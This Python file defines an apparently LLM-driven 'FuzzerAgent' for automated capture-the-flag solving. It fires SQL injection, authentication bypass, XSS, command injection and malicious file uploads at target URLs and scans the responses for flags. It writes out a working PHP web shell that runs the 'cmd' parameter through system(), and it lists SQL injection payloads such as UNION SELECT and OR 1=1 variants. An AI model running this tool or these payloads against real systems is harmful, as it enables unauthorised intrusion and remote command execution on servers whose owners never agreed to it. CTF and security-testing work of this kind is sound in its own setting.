"""
Fuzzing agent for exploiting identified vulnerabilities
"""
import re
import time
from typing import Dict, Any, List, Optional
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
try:
    from langchain_core.prompts import ChatPromptTemplate
    from langchain_core.messages import BaseMessage
except ImportError:
    # Fallback - create simple replacements
    class ChatPromptTemplate:
        @classmethod
        def from_messages(cls, messages):
            return cls()
        def format(self, **kwargs):
            return "Default prompt"
    
    class BaseMessage:
        def __init__(self, content=""):
            self.content = content

from src.agents.base import BaseAgent
from src.models.state import CTFState, AgentType
from src.models.challenge import ExploitAttempt, ExploitStatus
from src.utils.logging import get_logger

logger = get_logger(__name__)

class FuzzerAgent(BaseAgent):
    """Agent responsible for exploiting vulnerabilities through intelligent fuzzing"""
    
    def __init__(self):
        super().__init__(AgentType.FUZZER)
        self.session = requests.Session()
        self.driver = None
        self.max_attempts = 100
        self.exploit_timeout = 60
        
    def _get_role_description(self) -> str:
        return """systematically exploit identified vulnerabilities using intelligent fuzzing,
        execute attack payloads, analyze responses for flags, and adapt exploitation strategies based on results"""
    
    def execute(self, state: CTFState) -> CTFState:
        """Execute the fuzzing and exploitation process"""
        self.log_progress(state, "Starting intelligent fuzzing and exploitation", 0.1)
        
        try:
            # Setup web automation if needed
            self._setup_web_automation()
            
            # Get current fuzzing task
            if not state.fuzzing_queue:
                self.log_progress(state, "No fuzzing tasks in queue", 1.0)
                return state
            
            # Execute next fuzzing task
            fuzz_task = state.fuzzing_queue.pop(0)
            result = self._execute_fuzzing_task(state, fuzz_task)
            
            # Check if we found a flag
            if result and result.flag_found:
                self.log_progress(state, f"FLAG FOUND: {result.flag_found}", 1.0)
                state.workflow_status = state.workflow_status.COMPLETED
            else:
                # Generate adaptive fuzzing based on results
                adaptive_tasks = self._generate_adaptive_fuzzing(state, fuzz_task, result)
                state.fuzzing_queue.extend(adaptive_tasks)
                
                progress = 1.0 - (len(state.fuzzing_queue) / max(self.max_attempts, len(state.fuzzing_queue)))
                self.log_progress(state, f"Fuzzing task completed. {len(state.fuzzing_queue)} tasks remaining", progress)
            
            # Check if we should continue fuzzing
            if len(state.submission.exploit_attempts) >= self.max_attempts:
                self.log_progress(state, "Max fuzzing attempts reached", 1.0)
                state.complete_agent(AgentType.FUZZER)
            elif not state.fuzzing_queue:
                self.log_progress(state, "Fuzzing queue exhausted", 1.0)
                state.complete_agent(AgentType.FUZZER)
                
        except Exception as e:
            self.log_error(state, f"Fuzzing failed: {str(e)}")
        finally:
            if self.driver:
                self.driver.quit()
                self.driver = None
        
        return state
    
    def _setup_web_automation(self):
        """Setup web automation tools"""
        if self.driver is None:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
                self.driver.set_page_load_timeout(30)
            except Exception as e:
                logger.error(f"Failed to setup Selenium driver: {e}")
                self.driver = None
    
    def _execute_fuzzing_task(self, state: CTFState, task: Dict[str, Any]) -> Optional[ExploitAttempt]:
        """Execute a single fuzzing task"""
        start_time = time.time()
        
        # Create exploit attempt record
        attempt = ExploitAttempt(
            challenge_id=state.challenge.id,
            agent_name="fuzzer",
            attack_vector=task.get("attack_vector", "unknown"),
            payload=task.get("payload", ""),
            status=ExploitStatus.IN_PROGRESS
        )
        
        try:
            self.log_progress(state, f"Executing {task['vulnerability_type']} attack on {task['location']}", None)
            
            # Execute the attack based on vulnerability type
            if task["vulnerability_type"] == "sql_injection":
                result = self._exploit_sql_injection(task, attempt)
            elif task["vulnerability_type"] == "authentication_bypass":
                result = self._exploit_auth_bypass(task, attempt)
            elif task["vulnerability_type"] == "file_upload":
                result = self._exploit_file_upload(task, attempt)
            elif task["vulnerability_type"] == "xss":
                result = self._exploit_xss(task, attempt)
            elif task["vulnerability_type"] == "command_injection":
                result = self._exploit_command_injection(task, attempt)
            else:
                result = self._generic_exploit(task, attempt)
            
            # Analyze response for flags
            flag = self._extract_flag(result.get("response_content", ""), state.challenge.flag_format)
            if flag:
                attempt.flag_found = flag
                attempt.status = ExploitStatus.SUCCESS
                self.log_progress(state, f"FLAG FOUND: {flag}", None)
            else:
                attempt.status = ExploitStatus.FAILED
            
            attempt.execution_time = time.time() - start_time
            state.add_exploit_attempt(attempt)
            
            return attempt
            
        except Exception as e:
            attempt.status = ExploitStatus.FAILED
            attempt.error_message = str(e)
            attempt.execution_time = time.time() - start_time
            state.add_exploit_attempt(attempt)
            logger.error(f"Fuzzing task failed: {e}")
            return attempt
    
    def _exploit_sql_injection(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute SQL injection attack"""
        url = task["location"]
        payload = task["payload"]
        method = task.get("method", "GET").upper()
        parameters = task.get("parameters", {})
        
        # Inject payload into parameters
        injected_params = parameters.copy()
        for param_name in injected_params:
            injected_params[param_name] = payload
        
        attempt.request_data = {
            "url": url,
            "method": method,
            "parameters": injected_params,
            "payload_location": "parameters"
        }
        
        try:
            if method == "POST":
                response = self.session.post(url, data=injected_params, timeout=self.exploit_timeout)
            else:
                response = self.session.get(url, params=injected_params, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "content_length": len(response.text)
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": self._is_sql_injection_successful(response.text)
            }
            
        except Exception as e:
            raise Exception(f"SQL injection request failed: {e}")
    
    def _exploit_auth_bypass(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute authentication bypass attack"""
        url = task["location"]
        payload = task["payload"]
        method = task.get("method", "POST").upper()
        
        # Common auth bypass payloads
        auth_payloads = {
            "username": payload,
            "password": "password",
            "login": "Login"
        }
        
        attempt.request_data = {
            "url": url,
            "method": method,
            "credentials": auth_payloads
        }
        
        try:
            if method == "POST":
                response = self.session.post(url, data=auth_payloads, timeout=self.exploit_timeout)
            else:
                response = self.session.get(url, params=auth_payloads, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "redirect_location": response.headers.get("Location", "")
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": self._is_auth_bypass_successful(response)
            }
            
        except Exception as e:
            raise Exception(f"Auth bypass request failed: {e}")
    
    def _exploit_file_upload(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute file upload attack"""
        url = task["location"]
        payload = task["payload"]
        
        # Create malicious file content
        if payload.endswith(".php"):
            file_content = "<?php echo 'File uploaded successfully'; if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"
            filename = payload
        elif payload.endswith(".jsp"):
            file_content = "<% out.println(\"File uploaded successfully\"); %>"
            filename = payload
        else:
            file_content = "Test file content"
            filename = "test.txt"
        
        files = {"file": (filename, file_content, "text/plain")}
        
        attempt.request_data = {
            "url": url,
            "method": "POST",
            "filename": filename,
            "file_size": len(file_content)
        }
        
        try:
            response = self.session.post(url, files=files, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "headers": dict(response.headers)
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": self._is_file_upload_successful(response.text, filename)
            }
            
        except Exception as e:
            raise Exception(f"File upload request failed: {e}")
    
    def _exploit_xss(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute XSS attack"""
        url = task["location"]
        payload = task["payload"]
        method = task.get("method", "GET").upper()
        parameters = task.get("parameters", {})
        
        # Inject XSS payload
        injected_params = parameters.copy()
        for param_name in injected_params:
            injected_params[param_name] = payload
        
        attempt.request_data = {
            "url": url,
            "method": method,
            "parameters": injected_params,
            "xss_payload": payload
        }
        
        try:
            if method == "POST":
                response = self.session.post(url, data=injected_params, timeout=self.exploit_timeout)
            else:
                response = self.session.get(url, params=injected_params, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "reflected_payload": payload in response.text
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": payload in response.text
            }
            
        except Exception as e:
            raise Exception(f"XSS request failed: {e}")
    
    def _exploit_command_injection(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute command injection attack"""
        url = task["location"]
        payload = task["payload"]
        method = task.get("method", "GET").upper()
        parameters = task.get("parameters", {})
        
        # Inject command payload
        injected_params = parameters.copy()
        for param_name in injected_params:
            injected_params[param_name] = payload
        
        attempt.request_data = {
            "url": url,
            "method": method,
            "parameters": injected_params,
            "command_payload": payload
        }
        
        try:
            if method == "POST":
                response = self.session.post(url, data=injected_params, timeout=self.exploit_timeout)
            else:
                response = self.session.get(url, params=injected_params, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "content_length": len(response.text)
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": self._is_command_injection_successful(response.text, payload)
            }
            
        except Exception as e:
            raise Exception(f"Command injection request failed: {e}")
    
    def _generic_exploit(self, task: Dict[str, Any], attempt: ExploitAttempt) -> Dict[str, Any]:
        """Execute generic exploitation attempt"""
        url = task["location"]
        payload = task["payload"]
        method = task.get("method", "GET").upper()
        parameters = task.get("parameters", {})
        
        # Generic parameter injection
        injected_params = parameters.copy()
        if not injected_params:
            injected_params = {"test": payload}
        else:
            for param_name in injected_params:
                injected_params[param_name] = payload
        
        attempt.request_data = {
            "url": url,
            "method": method,
            "parameters": injected_params
        }
        
        try:
            if method == "POST":
                response = self.session.post(url, data=injected_params, timeout=self.exploit_timeout)
            else:
                response = self.session.get(url, params=injected_params, timeout=self.exploit_timeout)
            
            attempt.response_data = {
                "status_code": response.status_code,
                "content_length": len(response.text)
            }
            
            return {
                "response_content": response.text,
                "status_code": response.status_code,
                "success": response.status_code == 200
            }
            
        except Exception as e:
            raise Exception(f"Generic exploit request failed: {e}")
    
    def _extract_flag(self, content: str, flag_format: str) -> Optional[str]:
        """Extract flag from response content"""
        if not content or not flag_format:
            return None
        
        # Create regex pattern from flag format
        # Common CTF flag formats: CTF{...}, flag{...}, FLAG{...}
        patterns = [
            flag_format.replace("{", r"\{").replace("}", r"\}").replace("*", r"[^}]+"),
            r"CTF\{[^}]+\}",
            r"flag\{[^}]+\}",
            r"FLAG\{[^}]+\}",
            r"[A-Za-z0-9_]+\{[^}]+\}"
        ]
        
        for pattern in patterns:
            try:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    return matches[0]
            except re.error:
                continue
        
        return None
    
    def _is_sql_injection_successful(self, response_content: str) -> bool:
        """Check if SQL injection was successful"""
        success_indicators = [
            "mysql_fetch",
            "ora-01756",
            "microsoft ole db",
            "odbc sql server driver",
            "sqlite_master",
            "syntax error",
            "sql error",
            "database error",
            "welcome",  # Successful login
            "dashboard",  # Successful access
            "admin panel"
        ]
        
        content_lower = response_content.lower()
        return any(indicator in content_lower for indicator in success_indicators)
    
    def _is_auth_bypass_successful(self, response) -> bool:
        """Check if authentication bypass was successful"""
        # Check for redirects (common after successful login)
        if response.status_code in [302, 301, 303]:
            location = response.headers.get("Location", "")
            return any(path in location.lower() for path in ["dashboard", "admin", "home", "profile"])
        
        # Check response content for success indicators
        content_lower = response.text.lower()
        success_indicators = ["welcome", "dashboard", "logout", "admin panel", "profile"]
        failure_indicators = ["login failed", "invalid", "error", "denied"]
        
        has_success = any(indicator in content_lower for indicator in success_indicators)
        has_failure = any(indicator in content_lower for indicator in failure_indicators)
        
        return has_success and not has_failure
    
    def _is_file_upload_successful(self, response_content: str, filename: str) -> bool:
        """Check if file upload was successful"""
        success_indicators = [
            "uploaded successfully",
            "file uploaded",
            "upload complete",
            filename.lower(),
            "saved to"
        ]
        
        content_lower = response_content.lower()
        return any(indicator in content_lower for indicator in success_indicators)
    
    def _is_command_injection_successful(self, response_content: str, payload: str) -> bool:
        """Check if command injection was successful"""
        # Look for command output in response
        if "whoami" in payload.lower():
            return any(user in response_content.lower() for user in ["root", "www-data", "apache", "nginx"])
        elif "id" in payload.lower():
            return "uid=" in response_content.lower()
        elif "ls" in payload.lower():
            return any(file_ext in response_content for file_ext in [".txt", ".php", ".html", ".js"])
        
        return False
    
    def _generate_adaptive_fuzzing(self, state: CTFState, executed_task: Dict[str, Any], result: ExploitAttempt) -> List[Dict[str, Any]]:
        """Generate adaptive fuzzing tasks based on execution results"""
        if not result or result.status == ExploitStatus.FAILED:
            return []
        
        adaptive_tasks = []
        
        # If we got interesting response, try variations
        if result.response_data.get("status_code") == 200:
            # Try different payloads for the same vulnerability type
            vuln_type = executed_task["vulnerability_type"]
            location = executed_task["location"]
            
            if vuln_type == "sql_injection":
                additional_payloads = [
                    "' UNION SELECT 1,2,3--",
                    "' OR 1=1 LIMIT 1--",
                    "admin'/*",
                    "1' OR '1'='1",
                    "x' OR 1=1 OR 'x'='y"
                ]
                
                for payload in additional_payloads:
                    if payload not in state.attempted_payloads:
                        adaptive_task = executed_task.copy()
                        adaptive_task["payload"] = payload
                        adaptive_task["confidence"] = 0.8  # High confidence for variations
                        adaptive_tasks.append(adaptive_task)
                        state.attempted_payloads.add(payload)
        
        return adaptive_tasks